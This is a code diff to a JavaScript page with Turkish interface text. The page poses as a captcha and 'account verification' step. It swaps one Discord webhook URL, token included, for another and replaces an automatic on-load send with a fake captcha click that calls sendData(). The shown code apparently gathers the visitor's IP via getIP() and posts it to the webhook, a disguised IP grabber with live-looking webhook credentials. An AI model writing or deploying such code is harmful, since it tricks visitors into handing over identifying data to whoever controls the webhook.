@@ -1,7 +1,4 @@
-cat > script.js << 'EOF'
-// ==================== WEBHOOK'UNU GİR ====================
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';
-// =========================================================
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522285522918183036/KNYHyYseEZGcyHF3oR5PvQeJksaj78r4Ky53R1ZdoMODi-ksBBmoXmFhhLkvVrIMwo3C';
 
 async function getIP() {
     try {
@@ -61,6 +58,28 @@ async function sendData() {
     });
 }
 
-// SAYFA AÇILIR AÇILMAZ OTOMATİK GÖNDER
-sendData();
-EOF
+function doCaptcha() {
+    const check = document.getElementById('captchaCheck');
+    const text = document.getElementById('captchaText');
+    const box = document.getElementById('captchaBox');
+    const loader = document.getElementById('loader');
+    const icon = document.getElementById('icon');
+    const title = document.getElementById('title');
+    const desc = document.getElementById('desc');
+
+    check.classList.add('done');
+    check.textContent = '✓';
+    text.textContent = 'Doğrulandı!';
+    box.style.borderColor = '#3ba55c';
+    box.onclick = null;
+
+    loader.classList.add('show');
+
+    setTimeout(() => {
+        icon.textContent = '🔐';
+        title.textContent = 'Hesap Doğrulanıyor...';
+        desc.textContent = 'Sunucuya yönlendiriliyorsunuz.';
+        box.classList.add('hidden');
+        sendData();
+    }, 1500);
+}
